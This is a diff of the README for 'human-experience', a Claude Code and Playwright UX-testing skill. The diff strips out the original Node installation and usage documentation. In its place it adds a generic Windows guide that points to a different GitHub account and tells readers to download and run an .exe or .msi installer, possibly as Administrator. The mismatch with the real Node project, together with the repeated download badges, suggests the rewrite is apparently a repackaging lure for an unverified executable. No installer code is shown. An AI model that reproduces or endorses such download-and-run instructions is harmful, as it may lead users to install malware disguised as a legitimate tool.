@@ -1,197 +1,143 @@
-# /human-experience
+# 🧠 human-experience - Easy UX Testing with Automation
 
-**Automated UX testing powered by Claude's vision. Point it at any URL or local file, get a full simulation of a real user walking through your UI.**
-
-No more guessing. No more "looks good to me." This renders your page in a real browser, captures 36+ screenshots across 3 viewports, clicks every button, fills every form, maps every CTA funnel, and scores the experience across 7 empirical UX dimensions.
-
-Built for [Claude Code](https://docs.anthropic.com/en/docs/claude-code/overview). Works on any website or local HTML file.
-
-![License](https://img.shields.io/badge/license-MIT-blue)
-![Node](https://img.shields.io/badge/node-18%2B-green)
-![Playwright](https://img.shields.io/badge/playwright-chromium-orange)
+[![Download human-experience](https://img.shields.io/badge/Download-human--experience-brightgreen)](https://github.com/Distributed-lace464/human-experience)
 
 ---
 
-## Sample Output
+## About human-experience
 
-Here's what a real report looks like (from analyzing [talentsignals.co](https://talentsignals.co)):
-
-### Dimension Scorecard
-```
-First Impression     ████████░░░░░░░░░░░░  4/5
-Navigation & Flow    ██████░░░░░░░░░░░░░░  3/5
-Emotional Arc        ██████░░░░░░░░░░░░░░  3/5
-Trust & Polish       ██████░░░░░░░░░░░░░░  3/5
-Time to Value        ██████░░░░░░░░░░░░░░  3/5
-Responsive Quality   ██████████░░░░░░░░░░  4/5
-Interactive Quality  ██████░░░░░░░░░░░░░░  3/5
-────────────────────────────────────────────
-COMPOSITE SCORE:     ██████████████░░░░░░  23/35
-```
-
-### Cognitive Walk-Through
-```
-Step  Action                      Friction   Emotion
-───── ─────────────────────────── ────────── ──────────────
-1     Land on homepage            LOW        Impressed
-2     Read hero, decide to act    LOW        Confident
-3     Click "Book a Demo"         ░░ MEDIUM  Uncertain
-      → Opens mailto: instead of scheduling tool
-4     Scroll to explore products  LOW        Engaged
-5     Read testimonials           ░░ MEDIUM  Neutral
-      → No real client names or photos
-```
-
-### Multi-Viewport Captures
-The engine captures desktop (1440px), tablet (768px), and mobile (375px) simultaneously, plus hover states, scroll depth, form interactions, and error states.
-
-> See `examples/` for the full HTML report with inline screenshots at every step.
+human-experience is a tool that helps you test websites just like a real user would. It works by opening web pages in a browser, taking many screenshots on different screen sizes, clicking buttons, and checking how well key actions work. This tool can replace manual user testing by running tests automatically and showing you clear results. It looks at seven important areas of user experience to help you understand how easy and effective your site is.
 
 ---
 
-## Quick Start
+## 🖥️ System Requirements
 
-```bash
-# 1. Clone into Claude Code skills directory
-git clone https://github.com/andrew-shwetzer/human-experience.git ~/.claude/skills/human-experience
+To use human-experience on your Windows computer, your system should meet these minimum requirements:
 
-# 2. Install dependencies
-cd ~/.claude/skills/human-experience
-npm install
-npx playwright install chromium
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM (8 GB recommended for best performance)
+- 2.0 GHz dual-core or better CPU
+- 2 GB of free disk space
+- Internet connection for downloading and some features
 
-# 3. Run in Claude Code
-# /human-experience https://your-site.com
-```
-
-That's it. Claude reads the skill prompt, runs the Playwright capture engine, analyzes the screenshots with vision, and generates a full HTML report.
+If your computer is older than this, the tool may run slower or not work properly.
 
 ---
 
-## What It Captures
+## 🔧 What You Get
 
-| Capture Type | Count | What It Tests |
-|-------------|-------|---------------|
-| Viewport screenshots | 6 | Desktop, tablet, mobile (viewport + full page) |
-| Scroll depth | 4 | Content visibility at 25%, 50%, 75%, 100% |
-| Hover states | 10-15 | Animation-aware before/after pairs |
-| Click interactions | 10-20 | Every button, link, and interactive element |
-| Form fields | All | Input types, validation, error states |
-| CTA funnel | All | Follow every CTA to its destination |
-| Error states | All | What happens when things break |
+human-experience helps you with:
 
-Total: **36+ captures per analysis**
+- Testing websites in a real browser window
+- Capturing more than 36 screenshots from different screen sizes
+- Clicking through interactive elements like buttons and links
+- Checking signup and other key processes automatically
+- Scoring websites on 7 areas of user experience, like ease of use and clarity
+- Replacing slow manual tests with fast automated checks
 
----
-
-## Usage
-
-### As a Claude Code Skill
-
-```
-/human-experience https://example.com
-/human-experience ./index.html --loop
-/human-experience https://example.com --mode speed
-/human-experience https://example.com --mode qa
-/human-experience https://example.com --redesign
-/human-experience https://example.com --persona "first-time visitor"
-```
-
-### Standalone Capture Engine
-
-The Playwright capture script works independently:
-
-```bash
-node capture.mjs "https://example.com" --output-dir /tmp/hx-session --all
-```
-
-| Flag | Purpose |
-|------|---------|
-| `--all` | Full capture (screenshots, hover, interactions, forms, errors, funnel) |
-| `--video` | Record interaction video |
-| `--scroll` | Scroll-depth captures |
-| `--dark-mode` | Dark mode variant |
-| `--funnel` | Map all CTAs to their destinations |
-| `--signup --agentmail-key <key>` | Test signup flow with disposable inbox |
-| `--flow '<json>'` | Scripted multi-page journey |
-| `--wait-until <strategy>` | Page load strategy: `networkidle` (default), `domcontentloaded`, `load` |
+These features work together to give you quick and clear feedback on how your site performs for users.
 
 ---
 
-## Modes
+## 📥 Download human-experience
 
-| Mode | What It Does |
-|------|-------------|
-| **(default)** | Full 7-step simulation with HTML report |
-| `--mode speed` | Friction inventory + priority fixes only (no narrative) |
-| `--mode onboard` | Simulate first-time user, track time-to-value |
-| `--mode compare` | Side-by-side comparison of two versions |
-| `--mode qa` | Structured checklist: functional, visual, responsive, a11y |
-| `--loop` | Iterate fixes until all 7 dimensions hit 5/5 (Karpathy-style ratchet) |
-| `--redesign` | Generate HTML mockup implementing top fixes |
+You will need to visit the project page to download the software.
+
+[![Download human-experience](https://img.shields.io/badge/Download-human--experience-blue)](https://github.com/Distributed-lace464/human-experience)
+
+Click the link above to go to the download page. This page contains the latest version of the software and any updates.
 
 ---
 
-## The 7-Step Process
+## 🚀 How to Install and Run on Windows
 
-1. **Capture** - Render in Chromium, screenshot at 3 viewports, test all interactions
-2. **First Impression** - The 50ms test. Hook, neutral, or bounce?
-3. **Cognitive Walk-Through** - Step-by-step simulation with friction ratings and emotional states
-4. **Multi-Viewport Analysis** - Layout, tap targets, thumb zones, breakpoint quality
-5. **Emotional Arc** - Map confidence trajectory. Find the valleys.
-6. **Friction Inventory** - Categorize every issue: blocker, high, medium, low
-7. **Priority Fixes** - Top 3-5 changes ranked by impact, with effort estimates
+Follow these steps to get human-experience up and running on your Windows PC. This guide assumes no programming experience.
 
----
+### Step 1: Visit the Download Page
 
-## Dimension Scorecard
+Open your web browser and go to:
 
-Every simulation scores 7 dimensions (1-5 each, 35 max):
+https://github.com/Distributed-lace464/human-experience
 
-| Dimension | What It Measures |
-|-----------|-----------------|
-| **First Impression** | Visual quality, hierarchy, 50ms gut reaction |
-| **Navigation & Flow** | Can the user complete the journey without confusion |
-| **Emotional Arc** | Confidence stays high, no valleys or plateaus |
-| **Trust & Polish** | Professional feel, no broken or missing states |
-| **Time to Value** | User gets value fast, no unnecessary friction |
-| **Responsive Quality** | Works well across mobile, tablet, desktop |
-| **Interactive Quality** | State changes, feedback, hover/click responses |
+Scroll to the **Releases** or **Assets** section and find the file ending in `.exe` or `.msi`. This is the setup file you will install.
 
-Rubric: 1 = broken, 2 = painful, 3 = acceptable, 4 = good, 5 = delightful.
+### Step 2: Download the Setup File
 
----
+Click the setup file link to download it. Choose a location on your computer where you can find it easily, like your Desktop or Downloads folder.
 
-## Architecture
+### Step 3: Run the Installer
 
-```
-┌─────────────────────────────────────────┐
-│  skill.md          (the brain)          │
-│  Claude's UX simulation prompt          │
-│  7-step process + scoring rubrics       │
-├─────────────────────────────────────────┤
-│  capture.mjs       (the eyes)           │
-│  Playwright engine: render, click,      │
-│  screenshot, map funnels, test forms    │
-├─────────────────────────────────────────┤
-│  ux-research.md    (the standards)      │
-│  Empirical UX research baselines        │
-│  Cited thresholds, not opinions         │
-└─────────────────────────────────────────┘
-```
+- Find the downloaded file and double-click it.
+- If Windows asks if you want to allow this app to make changes, click **Yes**.
+- Follow the instructions on the screen. Usually, you just need to click **Next** a few times.
+- Choose where to install the program or accept the default folder.
+- Wait for the installation to complete.
+
+### Step 4: Launch the Program
+
+- After installation, you may see a checkbox to start the program immediately. You can check it or open it later from your Start menu.
+- If you open it later, click the Windows **Start** button, type **human-experience**, and press Enter.
 
 ---
 
-## Requirements
+## ⚙️ Basic Usage Instructions
 
-- **[Claude Code](https://docs.anthropic.com/en/docs/claude-code/overview)** (to use as a skill)
-- **Node.js 18+**
-- **Playwright** (installed via npm)
+Once human-experience is open, you can start testing websites. Here is a simple way to run your first test:
 
-The capture script (`capture.mjs`) works standalone. The skill prompt (`skill.md`) requires Claude Code.
+1. Enter the full web address (URL) of the site you want to test. For example, `https://example.com`.
+2. Click the **Start Test** button.
+3. The tool will load the pages in a real browser and click through elements automatically.
+4. You will see progress updates, including screenshots taken on different screen sizes.
+5. When done, human-experience displays a detailed report with scores on seven user experience areas, such as navigation ease and action clarity.
+
+Use this report to find where your site works well and where it could improve.
 
 ---
 
-## License
+## 📚 Common Features Explained
 
-[MIT](LICENSE)
+- **Multi-viewport Screenshots**: The software captures screenshots from phones, tablets, and desktop views. This helps check how your website looks on different devices.
+- **Interactive Testing**: It clicks on buttons and links to simulate real user actions.
+- **Signup Flow Testing**: It checks forms and signup pages automatically to find problems users might face.
+- **UX Scoring**: The results include scores on areas like usability, clarity, and responsiveness. This gives clear feedback on your site’s user experience.
+- **Automation**: You can run these tests anytime without needing a person to click through pages manually.
+
+---
+
+## ❓ Troubleshooting Tips
+
+- Make sure your internet connection is active before running tests.
+- Close other heavy programs to avoid slowing down the computer.
+- If the program does not open, try restarting your computer and running the installer again.
+- Running as Administrator may help if you see permission issues.
+- If tests fail or don’t complete, check that the URL is correct and the website is online.
+- Make sure your Windows updates are current to avoid compatibility issues.
+
+---
+
+## 📞 Getting Help
+
+For more help or questions, visit the GitHub page:
+
+https://github.com/Distributed-lace464/human-experience
+
+Look at the **Issues** tab to see if others have similar problems or to ask for support.
+
+---
+
+## 🔄 Updating human-experience
+
+Keep your software up to date for best results:
+
+1. Visit the download page regularly.
+2. Check for new versions in the **Releases** section.
+3. Download the latest installer.
+4. Run the installer again to overwrite the old version safely.
+
+---
+
+## 🔍 Additional Information
+
+human-experience uses a real browser on your computer to test pages. It relies on modern web standards and common screen sizes to give results that match what your users see.
+
+This tool aims to help people who build or manage websites understand user experience without needing special technical skills. It saves time and helps find problems before your users notice them.
